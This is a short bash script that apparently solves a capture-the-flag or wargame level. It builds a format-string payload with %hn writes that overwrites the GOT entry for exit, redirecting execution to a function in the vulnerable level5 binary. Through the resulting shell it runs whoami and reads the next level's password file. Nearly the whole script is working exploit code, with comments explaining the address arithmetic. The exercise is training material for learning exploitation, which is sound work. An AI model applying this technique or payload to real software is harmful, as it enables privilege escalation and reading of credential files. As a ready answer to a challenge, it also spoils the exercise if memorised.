#!/bin/bash

GETPASS="cat /home/user/level6/.pass"

set -x

WRITE_ADDRESS_HIGH="\x3a\x98\x04\x08" # exit address: 0x08049838 + 2
WRITE_ADDRESS_LOW="\x38\x98\x04\x08" # exit address: 0x08049838
PADDING_HIGH="%2044x"            # o address: 0x080484a4 & 0xffff = 0x0804 - 8 = 0x7fc (2044) => prints 0x0804 
SPECIFIER_HIGH='%4$hn'
PADDING_LOW="%31904x"            # o address: 0x080484a4 & 0x0000fffff = 0x84a4 - 0x0804 = 0x7ca0 (31904)
SPECIFIER_LOW='%5$hn'

WRITE_ADDRESSES="${WRITE_ADDRESS_HIGH}${WRITE_ADDRESS_LOW}"
HIGH_PART="${PADDING_HIGH}${SPECIFIER_HIGH}"
LOW_PART="${PADDING_LOW}${SPECIFIER_LOW}"

python -c "print('$WRITE_ADDRESSES' + '$HIGH_PART' + '$LOW_PART')" > /tmp/exploit5

(cat /tmp/exploit5 - | ~/level5) > /tmp/output5 << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI

cat /tmp/output5 | tr -s ' '